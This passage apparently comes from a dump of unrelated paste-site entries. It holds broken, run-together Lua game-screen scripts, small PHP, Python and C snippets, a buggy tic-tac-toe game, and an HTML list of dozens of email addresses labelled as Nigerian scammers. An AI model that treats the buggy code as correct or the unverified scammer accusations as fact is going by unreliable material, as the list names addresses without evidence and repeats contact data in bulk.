scroll = input.getNumber(1)
reset = input.getNumber(2)

    local bool1 = {}
    for i = 1, 32 do
        if input.getBool(i) then bool1[i]=true end
    end
    printable={}
    for k,v in pairs(bool1) do
        if v then table.insert(printable, string.format(""%02d"", k)) end
    end
    
    if reset == 1 then
		printable = {}
			end
end

function onDraw()
    screen.setColor(10,18,5,150)
    screen.drawRectF(0,7,100,100)
    screen.setColor(0,0,0)
    screen.drawTextBox(2,8-scroll,32,32,table.concat(printable, ','))
	screen.setColor(5,9,2)
	screen.drawRectF(0,0,64,7)
	screen.setColor(0,0,0)
    screen.drawTextBox(0,1,32,6,""Bool"",0,0)
end
	if HL == true and fl == true then
		screen.drawTextBox(0,0,64,32,(""High < Low""),0,0)
			else
		end

	if on == true and NI == false and HL == false and ti >= 0  then
		screen.drawRect(2,29,1,1)
			else
			end	
	
	if on == true and NI == false and HL == false and ti > 0 then
		screen.drawRect(5,29,1,1)
			else
			end		
	
	if on == true and NI == false and HL == false and ti > 1 then
		screen.drawRect(8,29,1,1)
			else
	end					

end

-- Tick function that will be executed every logic tick
function onTick()
	l = input.getNumber(1)
	h = input.getNumber(2)
	
	if l <= 0 then
		output.setNumber(1,l+(-10))
			end
	if l > 0 then
		output.setNumber(1,l+10)
			end
			
	if h <= 0 then
		output.setNumber(2,h+(-10))
			end
	if h > 0 then
		output.setNumber(2,h+10)
			end		
			
			
	if h < l then
		output.setBool(1,true)
			else
				output.setBool(1,false)
			end		
end
function onTick()
	inputX = input.getNumber(3)
	inputY = input.getNumber(4)
	isPressed = input.getBool(1)


	ScrollP = isPressed and isPointInRectangle(inputX, inputY, 5, 26, 7, 6)
	ResetP = isPressed and isPointInRectangle(inputX, inputY, 18, 26, 7, 6)
	SwitchP = isPressed and isPointInRectangle(inputX, inputY, 0, 0, 64, 7)
	
	output.setBool(1,ScrollP )
	output.setBool(2, ResetP)
	output.setBool(3, SwitchP)
end


function isPointInRectangle(x, y, rectX, rectY, rectW, rectH)
	return x > rectX and y > rectY and x < rectX+rectW and y < rectY+rectH
		end
	
	
function onDraw()
screen.setColor(10,18,5,150)
screen.drawRectF(0,25,32,10)
screen.setColor(0,0,0,0)
screen.drawRectF(0,0,64,7)

screen.setColor(0,0,0)

if ScrollP == true then
	screen.setColor(50,30,15)
		else
			screen.setColor(0,0,0)
		end

screen.drawRect(5,26,7,6)
screen.drawText(7,27,""S"")

if ResetP == true then
	screen.setColor(50,30,15)
		else
			screen.setColor(0,0,0)
		end

screen.drawRect(18,26,7,6)
screen.drawText(20,27,""R"")
end-- Tick function that will be executed every logic tick
function onTick()
	on = input.getBool(1)
	blink = input.getBool(2)
	
	
	
	x = math.random(-1,1)
	
	if on == true then
	
	for i=1,32 do
	output.setNumber(i,1)
	output.setBool(i,blink)
		end
			else
				output.setNumber(i,-1)
				output.setBool(i,false)
					end
		
	
					
		
		
	
	
end

-- Draw function that will be executed when this script renders to a screen
function onDraw()
	w = screen.getWidth()				  -- Get the screen's width and height
	h = screen.getHeight()					
	screen.setColor(0, 255, 0)			 -- Set draw color to green
	screen.drawCircleF(w / 2, h / 2, 30)   -- Draw a 30px radius circle in the center of the screen
end"
qympRTJY,Untitled,developer,PHP,Monday 3rd of July 2023 01:19:28 PM CDT,"$headers = [];
if (function_exists(""getallheaders"")) {
    $headers = getallheaders();
} else {
    function getallheaders()
    {
        $headers = [];
        foreach ($_SERVER as $name => $value) {
            if (substr($name, 0, 5) == ""HTTP_"") {
                $headers[
                    str_replace(
                        "" "",
                        ""-"",
                        ucwords(
                            strtolower(str_replace(""_"", "" "", substr($name, 5)))
                        )
                    )
                ] = $value;
            }
        }
        return $headers;
    }
    $headers = getallheaders();
}"
NuRakEYK,init,Zlogdan,Python,Monday 3rd of July 2023 01:17:37 PM CDT,"def test_init(*data):
    length = len(data)
    if length == 0:
        x = 0
        y = 0
    elif length == 1:
        tupleXY = data[0]
        x = tupleXY[0]
        y = tupleXY[1]
    elif length == 2:
        x = data[0]
        y = data[1]
    print(x, y)

test_init(1, 2)
test_init((1, 2))
test_init()
"
Fk6brC4w,tictactoe(if-statement problem),mrgoatman,Python,Monday 3rd of July 2023 01:07:48 PM CDT,"#!/usr/bin/env python
import random

#board = [['x','o','x'], ['x','x','x'], ['o','o','x']]
#user = 'x'
#bot = 'o'

class win_checker:
   def __init__(self, list_2d, player):
      self.list_2d = list_2d
      self.player = player
      
   #Row checking
   def row_check(self):
      for i in range(len(self.list_2d)):
         row = 0
         
         for k in range(len(self.list_2d[i])):
            if self.list_2d[i][k] == self.player:
               row += 1
               
            elif self.list_2d[i][k] != self.player:
               row = 0
               break
               
         if row == 3:
            return 1
            
         elif row == 0:
            continue
            
         elif row != 3 and row != 0:
            print('row = ', row)
            return 'ERROR'
            
      if row == 0:
         return 0
         
      elif row == 3:
         return 'Lines 25-26 skipped?'
         
      elif row != 3 and row != 0:
         return 'Huston, we have a problem!'
         
   #Column checking
   def column_check(self):
      for i in range(len(self.list_2d)):
         column = 0
         
         for k in range(len(self.list_2d[i])):
            if self.list_2d[k][i] == self.player:
               column += 1
               
            elif self.list_2d[k][i] != self.player:
               column = 0
               break
               
         if column == 3:
            return 1
            
         elif column == 0:
            continue
            
         elif column != 3 and column != 0:
            print('column = ', column)
            return 'ERROR'
            
      if column == 0:
         return 0
         
      elif column == 3:
         return 'Lines 57-58 skipped?'
         
      elif column != 3 and column != 0:
         return 'Huston, we have a problem!'
         
#Diagonal checking
   def diagonal_check(self):
      if self.list_2d[0][0] == self.player and self.list_2d[1][1] == self.player and self.list_2d[2][2] == self.player:
         return 1
         
      elif self.list_2d[2][2] == self.player and self.list_2d[1][1] == self.player and self.list_2d[0][0] == self.player:
         return 1
         
      else:
         return 0
         
#Checking for everything
   def check_all(self):
      if self.row_check() == 1 or self.column_check() == 1 or self.diagonal_check() == 1:
         return 1
         
      else:
         return 0
      

#uwc = win_checker(board, user)

#print(uwc.row_check())
#print(uwc.column_check())
#print(uwc.diagonal_check())
#print(uwc.check_all())

class game_flow:
   def __init__(self):
      self.board = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]
      self.user = 'Undetermined'
      self.bot = 'Undetermined'
   
   #Resets everything in the game
   def reset(self):
      self.board = [['1', '2', '3'], ['4', '5', '6'], ['7', '8', '9']]
      
      valid_input = 0
      
      while valid_input == 0:
         self.user = input('Will you be X or O?: ')
         
         if self.user != 'x' and self.user != 'X' and self.user != 'o' and self.user != 'O':
            print('Invalid input')
            continue
            
         elif self.user == 'x' or self.user == 'X':
            self.user = 'X'
            self.bot = 'O'
            valid_input = 1
            
         elif self.user == 'o' or self.user == 'O':
            self.user = 'O'
            self.bot = 'X'
            valid_input = 1
      
      
   def print_board(self):
      board_text = f''' {self.board[0][0]} : {self.board[0][1]} : {self.board[0][2]}
...........
 {self.board[1][0]} : {self.board[1][1]} : {self.board[1][2]}
...........
 {self.board[2][0]} : {self.board[2][1]} : {self.board[2][2]}'''
      
      print(board_text)
      
   def bot_move(self):
      valid_move = 0
      
      while valid_move == 0:
         move = random.randint(1,9)
         
         print(f'bot move: {move}')
         
         for i in range(len(self.board)):
            
            print(f'self.board[i] = {self.board[i]}')
            
            for k in range(len(self.board[i])):
               
               print(f'self.board[{i}][{k}] = {self.board[i][k]}')
               print(f'self.board[{i}][{k}] == move: {self.board[i][k] == move}')
               
               if self.board[i][k] == move:
                  print('self.board[i][k] == move')
                  
                  self.board[i][k] = self.bot
                  valid_move = 1
      
   def user_move(self):
      valid_move = 0
      
      while valid_move == 0:
         move = input('Enter your move: ')
         
         if move != 'X' and move != 'O':
            for i in range(len(self.board)):
               for k in range(len(self.board[i])):
                  if self.board[i][k] == move:
                     self.board[i][k] = self.user
                     valid_move = 1
                     
         if valid_move == 0:
            print('Invalid input')
            
   def play(self):
      play = 1
      
      while play == 1:
         winner = 0
         first_move = random.randint(0,1)
         
         self.reset()
         self.print_board()
         
         if first_move == 1:
            while winner == 0:
               
               
               
               self.user_move()
               self.print_board()
               
               user_win = win_checker(self.board, self.user)
               
               if user_win.check_all() == 1:
                  print('WINNER!')
                  print('You win!')
                  winner = 1
                  break
               
               self.bot_move()
               self.print_board()
               
               bot_win = win_checker(self.board, self.bot)
               
               if bot_win.check_all() == 1:
                  print('LOOSER!')
                  print('Bot wins!')
                  winner = 1
                  break
               
         elif first_move == 0:
            while winner == 0:
               
               self.bot_move()
               self.print_board()
               
               bot_win = win_checker(self.board, self.bot)
               
               if bot_win.check_all() == 1:
                  print('LOOSER!')
                  print('Bot wins!')
                  winner = 1
                  break
               
               self.user_move()
               self.print_board()
               
               user_win = win_checker(self.board, self.user)
               
               if user_win.check_all() == 1:
                  print('WINNER!')
                  print('You win!')
                  winner = 1
                  break
            
         valid_input2 = 0
         
         while valid_input2 == 0:
            keep_playing = input('Play again?')
            
            if keep_playing == 'Y' or 'y':
               valid_input2 = 1
               
            elif keep_playing == 'N' or 'n':
               valid_input2 = 1
               print('Thanks for playing!')
               play = 0
               
            else:
               print('Invalid input')

game = game_flow()

#game.reset()
#game.print_board()

game.play()

"
extgDhNs,Character Shuffling,tsounakis,C,Monday 3rd of July 2023 01:02:55 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#define MAP_SIZE 26

void createRandomMap(char map[MAP_SIZE]) {
    int i;
    for (i = 0; i < MAP_SIZE; i++) {
        map[i] = 'A' + i;
    }

    // Fisher - Yates algorithm
    for (i = MAP_SIZE - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        char temp = map[i];
        map[i] = map[j];
        map[j] = temp;
    }
}

void applyMapping(char *j, int count, char charMap[MAP_SIZE], int reverse) {
    int i;
    for (i = 0; i < count; i++) {
        if (j[i] >= 'A' && j[i] <= 'Z') {
            if (reverse) {
                char mappedChar = 'A';
                while (charMap[mappedChar - 'A'] != j[i]) {
                    mappedChar++;
                }
                j[i] = mappedChar;
            } else {
                j[i] = charMap[j[i] - 'A'];
            }
        }
    }
}

int main() {
    srand(time(NULL));

    char charMap[MAP_SIZE];
    createRandomMap(charMap);

    char *j = malloc(sizeof(char));
    char input;
    int count;
    int reverseMapping = 0;

    while (1) {
        printf(""Enter capital letters (terminate with '$', or 'q' to quit): "");

        count = 0;
        while (1) {
            scanf("" %c"", &input);
            if (input == '$') {
                break;
            } else if (input == 'q') {
                free(j);
                return 0;
            }

            if (input >= 'A' && input <= 'Z') {
                j = realloc(j, (count + 1) * sizeof(char));
                j[count] = input;
                count++;
            }
        }

        printf(""Original characters:\n"");
        int i;
        for (i = 0; i < count; i++) {
            printf(""%c"", j[i]);
        }
        printf(""\n"");

        applyMapping(j, count, charMap, reverseMapping);

        printf(""Mapped characters:\n"");
        for (i = 0; i < count; i++) {
            printf(""%c"", j[i]);
        }
        printf(""\n\n"");

        reverseMapping = !reverseMapping;
    }

    free(j);

    return 0;
}
"
rncvu2Mg,languages.py,Rousk,Python,Monday 3rd of July 2023 12:34:45 PM CDT,"import gettext
import logging
import os

from qweborf import get_workbench

logger = logging.getLogger(__name__)

BASE_LANGUAGE_CODE = ""en_US""
BASE_LANGUAGE_NAME = ""English""

LANGUAGES_DICT = {
    ""cs_CZ"": ""Čeština [BETA]"",
    ""de_DE"": ""Deutsch"",
    ""et_EE"": ""Eesti"",
    BASE_LANGUAGE_CODE: BASE_LANGUAGE_NAME,
    ""es_ES"": ""Español"",
    ""fr_FR"": ""Français"",
    ""it_IT"": ""Italiano"",
    ""lt_LT"": ""Lietuvių"",
    ""hu_HU"": ""Magyar [BETA]"",
    ""nb_NO"": ""Norsk (Bokmål)"",
    ""nn_NO"": ""Norsk (Nynorsk)"",
    ""nl_NL"": ""Nederlands"",
    ""pl_PL"": ""Polski"",
    ""pt_PT"": ""Português (PT)"",
    ""pt_BR"": ""Português (BR)"",
    ""ro_RO"": ""Român"",
    ""ru_RU"": ""Русский"",
    ""sk_SK"": ""Slovenčina [BETA]"",
    ""fi_FI"": ""Suomi [BETA]"",
    ""sv_SE"": ""Svenska [BETA]"",
    ""sq_AL"": ""Shqip [ALPHA]"",
    ""tr_TR"": ""Türkçe [BETA]"",
    ""uk_UA"": ""Українська"",
    ""zh_TW"": ""繁體中文-TW"",
    ""zh_CN"": ""简体中文 "",
    ""ja_JP"": ""日本語  [ALPHA]"",
    ""hy_AM"": ""Հայերէն [BETA]"",
    ""fa_IR"": ""[BETA] فارسی"",
    ""el_GR"": ""Ελληνικά"",
    ""ko_KR"": ""한국어 [韓國語] [ALPHA]"",
}

# how many spaces to add to button caption in order to make whole text visible
BUTTON_PADDING_SIZES = {""zh_TW"": 4, ""zh_CN"": 4, ""ja_JP"": 4}

_translation = gettext.NullTranslations()


def get_button_padding():
    code = get_workbench().get_option(""general.language"")
    if code in BUTTON_PADDING_SIZES:
        return BUTTON_PADDING_SIZES[code] * "" ""
    else:
        return """"


def get_language_code_by_name(name):
    for code in LANGUAGES_DICT:
        if LANGUAGES_DICT[code] == name:
            return code

    raise RuntimeError(""Unknown language name '%s'"" % name)


def tr(message: str) -> str:
    return _translation.gettext(message)


def set_language(language_code: str) -> None:
    global _translation
    try:
        path = os.path.join(os.path.dirname(__file__), ""locale"")
        _translation = gettext.translation(""qweborf"", path, [language_code])
    except Exception as e:
        logger.exception(""Could not set language to '%s"", language_code, exc_info=e)
        _translation = gettext.NullTranslations()
"
FZ02AFYm,Nigerian scammers [3-7-2/2023],bombaires,HTML,Monday 3rd of July 2023 12:33:18 PM CDT,"<a href=""mailto:kevinnknight1@hotmail.com"">kevinnknight1@hotmail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1@googlemail.com"">keystoneb.jeffwilkinson1@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+4142@googlemail.com"">keystoneb.jeffwilkinson1+4142@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+19529@googlemail.com"">keystoneb.jeffwilkinson1+19529@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+16084@googlemail.com"">keystoneb.jeffwilkinson1+16084@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+30672@googlemail.com"">keystoneb.jeffwilkinson1+30672@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+19076@googlemail.com"">keystoneb.jeffwilkinson1+19076@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+21427@googlemail.com"">keystoneb.jeffwilkinson1+21427@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+15085@googlemail.com"">keystoneb.jeffwilkinson1+15085@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+28518@googlemail.com"">keystoneb.jeffwilkinson1+28518@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+28915@googlemail.com"">keystoneb.jeffwilkinson1+28915@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+4503@googlemail.com"">keystoneb.jeffwilkinson1+4503@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+30084@googlemail.com"">keystoneb.jeffwilkinson1+30084@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+9181@googlemail.com"">keystoneb.jeffwilkinson1+9181@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+27883@googlemail.com"">keystoneb.jeffwilkinson1+27883@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+27222@googlemail.com"">keystoneb.jeffwilkinson1+27222@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+6080@googlemail.com"">keystoneb.jeffwilkinson1+6080@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+28048@googlemail.com"">keystoneb.jeffwilkinson1+28048@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+26662@googlemail.com"">keystoneb.jeffwilkinson1+26662@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+28907@googlemail.com"">keystoneb.jeffwilkinson1+28907@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+30653@googlemail.com"">keystoneb.jeffwilkinson1+30653@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+20106@googlemail.com"">keystoneb.jeffwilkinson1+20106@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+31895@googlemail.com"">keystoneb.jeffwilkinson1+31895@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+27558@googlemail.com"">keystoneb.jeffwilkinson1+27558@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+8113@googlemail.com"">keystoneb.jeffwilkinson1+8113@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+18868@googlemail.com"">keystoneb.jeffwilkinson1+18868@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+28848@googlemail.com"">keystoneb.jeffwilkinson1+28848@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+6118@googlemail.com"">keystoneb.jeffwilkinson1+6118@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+31211@googlemail.com"">keystoneb.jeffwilkinson1+31211@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+11592@googlemail.com"">keystoneb.jeffwilkinson1+11592@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+30776@googlemail.com"">keystoneb.jeffwilkinson1+30776@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+20421@googlemail.com"">keystoneb.jeffwilkinson1+20421@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+21647@googlemail.com"">keystoneb.jeffwilkinson1+21647@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+10090@googlemail.com"">keystoneb.jeffwilkinson1+10090@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+12177@googlemail.com"">keystoneb.jeffwilkinson1+12177@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+5992@googlemail.com"">keystoneb.jeffwilkinson1+5992@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+14719@googlemail.com"">keystoneb.jeffwilkinson1+14719@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+14274@googlemail.com"">keystoneb.jeffwilkinson1+14274@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+3831@googlemail.com"">keystoneb.jeffwilkinson1+3831@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+32744@googlemail.com"">keystoneb.jeffwilkinson1+32744@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+14954@googlemail.com"">keystoneb.jeffwilkinson1+14954@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+20093@googlemail.com"">keystoneb.jeffwilkinson1+20093@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+23169@googlemail.com"">keystoneb.jeffwilkinson1+23169@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+5272@googlemail.com"">keystoneb.jeffwilkinson1+5272@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+20628@googlemail.com"">keystoneb.jeffwilkinson1+20628@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+10515@googlemail.com"">keystoneb.jeffwilkinson1+10515@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+2140@googlemail.com"">keystoneb.jeffwilkinson1+2140@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+20365@googlemail.com"">keystoneb.jeffwilkinson1+20365@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+10616@googlemail.com"">keystoneb.jeffwilkinson1+10616@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+16530@googlemail.com"">keystoneb.jeffwilkinson1+16530@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+8832@googlemail.com"">keystoneb.jeffwilkinson1+8832@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+22369@googlemail.com"">keystoneb.jeffwilkinson1+22369@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+26725@googlemail.com"">keystoneb.jeffwilkinson1+26725@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+16461@googlemail.com"">keystoneb.jeffwilkinson1+16461@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+6775@googlemail.com"">keystoneb.jeffwilkinson1+6775@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+10158@googlemail.com"">keystoneb.jeffwilkinson1+10158@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+19203@googlemail.com"">keystoneb.jeffwilkinson1+19203@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+783@googlemail.com"">keystoneb.jeffwilkinson1+783@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+8226@googlemail.com"">keystoneb.jeffwilkinson1+8226@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+24456@googlemail.com"">keystoneb.jeffwilkinson1+24456@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+8531@googlemail.com"">keystoneb.jeffwilkinson1+8531@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+5280@googlemail.com"">keystoneb.jeffwilkinson1+5280@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+25964@googlemail.com"">keystoneb.jeffwilkinson1+25964@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+18168@googlemail.com"">keystoneb.jeffwilkinson1+18168@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+4444@googlemail.com"">keystoneb.jeffwilkinson1+4444@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+17905@googlemail.com"">keystoneb.jeffwilkinson1+17905@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+16635@googlemail.com"">keystoneb.jeffwilkinson1+16635@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+9558@googlemail.com"">keystoneb.jeffwilkinson1+9558@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+29494@googlemail.com"">keystoneb.jeffwilkinson1+29494@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+29348@googlemail.com"">keystoneb.jeffwilkinson1+29348@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+12161@googlemail.com"">keystoneb.jeffwilkinson1+12161@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+15230@googlemail.com"">keystoneb.jeffwilkinson1+15230@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+28515@googlemail.com"">keystoneb.jeffwilkinson1+28515@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+28961@googlemail.com"">keystoneb.jeffwilkinson1+28961@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+11627@googlemail.com"">keystoneb.jeffwilkinson1+11627@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+17685@googlemail.com"">keystoneb.jeffwilkinson1+17685@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+8403@googlemail.com"">keystoneb.jeffwilkinson1+8403@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+11212@googlemail.com"">keystoneb.jeffwilkinson1+11212@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+25886@googlemail.com"">keystoneb.jeffwilkinson1+25886@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+12124@googlemail.com"">keystoneb.jeffwilkinson1+12124@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+15280@googlemail.com"">keystoneb.jeffwilkinson1+15280@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+4574@googlemail.com"">keystoneb.jeffwilkinson1+4574@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+21664@googlemail.com"">keystoneb.jeffwilkinson1+21664@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+29234@googlemail.com"">keystoneb.jeffwilkinson1+29234@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+23700@googlemail.com"">keystoneb.jeffwilkinson1+23700@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+2951@googlemail.com"">keystoneb.jeffwilkinson1+2951@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+19561@googlemail.com"">keystoneb.jeffwilkinson1+19561@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+20092@googlemail.com"">keystoneb.jeffwilkinson1+20092@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+9926@googlemail.com"">keystoneb.jeffwilkinson1+9926@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+20192@googlemail.com"">keystoneb.jeffwilkinson1+20192@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+27978@googlemail.com"">keystoneb.jeffwilkinson1+27978@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+19012@googlemail.com"">keystoneb.jeffwilkinson1+19012@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+17278@googlemail.com"">keystoneb.jeffwilkinson1+17278@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+20892@googlemail.com"">keystoneb.jeffwilkinson1+20892@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+30291@googlemail.com"">keystoneb.jeffwilkinson1+30291@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+25525@googlemail.com"">keystoneb.jeffwilkinson1+25525@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+23568@googlemail.com"">keystoneb.jeffwilkinson1+23568@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+23252@googlemail.com"">keystoneb.jeffwilkinson1+23252@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+28069@googlemail.com"">keystoneb.jeffwilkinson1+28069@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+22698@googlemail.com"">keystoneb.jeffwilkinson1+22698@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+4668@googlemail.com"">keystoneb.jeffwilkinson1+4668@googlemail.com</a>
<a href=""mailto:keystoneb.jeffwilkinson1+2350@googlemail.com"">keystoneb.jeffwilkinson1+2350@googlemail.com</a>
<a href=""mailto:agentvictorokle@googlemail.com"">agentvictorokle@googlemail.com</a>
<a href=""mailto:agentvictorokle+29700@googlemail.com"">agentvictorokle+29700@googlemail.com</a>
<a href=""mailto:agentvictorokle+19015@googlemail.com"">agentvictorokle+19015@googlemail.com</a>
<a href=""mailto:agentvictorokle+494@googlemail.com"">agentvictorokle+494@googlemail.com</a>
<a href=""mailto:agentvictorokle+3295@googlemail.com"">agentvictorokle+3295@googlemail.com</a>
<a href=""mailto:agentvictorokle+12609@googlemail.com"">agentvictorokle+12609@googlemail.com</a>
<a href=""mailto:agentvictorokle+22041@googlemail.com"">agentvictorokle+22041@googlemail.com</a>
<a href=""mailto:agentvictorokle+14904@googlemail.com"">agentvictorokle+14904@googlemail.com</a>
<a href=""mailto:agentvictorokle+26587@googlemail.com"">agentvictorokle+26587@googlemail.com</a>
<a href=""mailto:agentvictorokle+9849@googlemail.com"">agentvictorokle+9849@googlemail.com</a>
<a href=""mailto:agentvictorokle+30586@googlemail.com"">agentvictorokle+30586@googlemail.com</a>
<a href=""mailto:agentvictorokle+16493@googlemail.com"">agentvictorokle+16493@googlemail.com</a>
<a href=""mailto:agentvictorokle+31486@googlemail.com"">agentvictorokle+31486@googlemail.com</a>
<a href=""mailto:agentvictorokle+10406@googlemail.com"">agentvictorokle+10406@googlemail.com</a>
<a href=""mailto:agentvictorokle+2724@googlemail.com"">agentvictorokle+2724@googlemail.com</a>
<a href=""mailto:agentvictorokle+1570@googlemail.com"">agentvictorokle+1570@googlemail.com</a>
<a href=""mailto:agentvictorokle+26001@googlemail.com"">agentvictorokle+26001@googlemail.com</a>
<a href=""mailto:agentvictorokle+8549@googlemail.com"">agentvictorokle+8549@googlemail.com</a>
<a href=""mailto:agentvictorokle+20024@googlemail.com"">agentvictorokle+20024@googlemail.com</a>
<a href=""mailto:agentvictorokle+19755@googlemail.com"">agentvictorokle+19755@googlemail.com</a>
<a href=""mailto:agentvictorokle+23426@googlemail.com"">agentvictorokle+23426@googlemail.com</a>
<a href=""mailto:agentvictorokle+32431@googlemail.com"">agentvictorokle+32431@googlemail.com</a>
<a href=""mailto:agentvictorokle+14707@googlemail.com"">agentvictorokle+14707@googlemail.com</a>
<a href=""mailto:agentvictorokle+5522@googlemail.com"">agentvictorokle+5522@googlemail.com</a>
<a href=""mailto:agentvictorokle+12811@googlemail.com"">agentvictorokle+12811@googlemail.com</a>
<a href=""mailto:agentvictorokle+2620@googlemail.com"">agentvictorokle+2620@googlemail.com</a>
<a href=""mailto:agentvictorokle+15157@googlemail.com"">agentvictorokle+15157@googlemail.com</a>
<a href=""mailto:agentvictorokle+17759@googlemail.com"">agentvictorokle+17759@googlemail.com</a>
<a href=""mailto:agentvictorokle+21389@googlemail.com"">agentvictorokle+21389@googlemail.com</a>
<a href=""mailto:agentvictorokle+10134@googlemail.com"">agentvictorokle+10134@googlemail.com</a>
<a href=""mailto:agentvictorokle+4939@googlemail.com"">agentvictorokle+4939@googlemail.com</a>
<a href=""mailto:agentvictorokle+19401@googlemail.com"">agentvictorokle+19401@googlemail.com</a>
<a href=""mailto:agentvictorokle+7501@googlemail.com"">agentvictorokle+7501@googlemail.com</a>
